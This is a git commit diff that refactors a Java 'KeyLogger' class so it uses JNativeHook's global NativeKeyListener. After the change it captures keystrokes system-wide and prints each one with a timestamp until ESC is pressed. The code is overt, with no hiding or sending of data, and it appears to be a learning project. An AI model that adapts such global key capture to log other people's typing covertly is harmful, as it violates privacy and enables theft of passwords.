9024cd8a9f366b515246eb463d00e41d4b4540eb
Georgios Giannopoulos <georgegiannopoulos2@gmail.com>
2025-07-03 17:56:56 +0300

    Refactor KeyLogger to implement NativeKeyListener for improved key event handling

--- src/main/java/com/github/giorgosg1an/KeyLogger.java
+++ src/main/java/com/github/giorgosg1an/KeyLogger.java
@@ -1,26 +1,29 @@
 package com.github.giorgosg1an;
 
-import java.awt.KeyEventDispatcher;
-import java.awt.event.KeyEvent;
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
-
-public class KeyLogger implements KeyEventDispatcher{
+public class KeyLogger implements NativeKeyListener{
     
     @Override
-    public boolean dispatchKeyEvent(KeyEvent e) {
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        String timestamp = TimestampUtil.now();
+        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
 
-        if (e.getID() == KeyEvent.KEY_PRESSED) {
-            String timestamp = TimestampUtil.now();
-            String keyText = KeyEvent.getKeyText(e.getKeyCode());
+        System.out.println("[" + timestamp + "] Key: " + keyText);
 
-            System.out.println("[" + timestamp + "] Key: " + keyText);
+        // Exit on ESC Key
+        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+            System.out.println("Exiting keylogger.");
 
-            // Exit on ESC
-            if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
-                System.out.println("Exiting keylogger.");
-                System.exit(0);
+            try {
+                GlobalScreen.unregisterNativeHook();
+            } catch (NativeHookException ex) {
+                System.out.println(ex.getMessage());
             }
+            System.exit(0);
         }
-        return false;
     }
 }
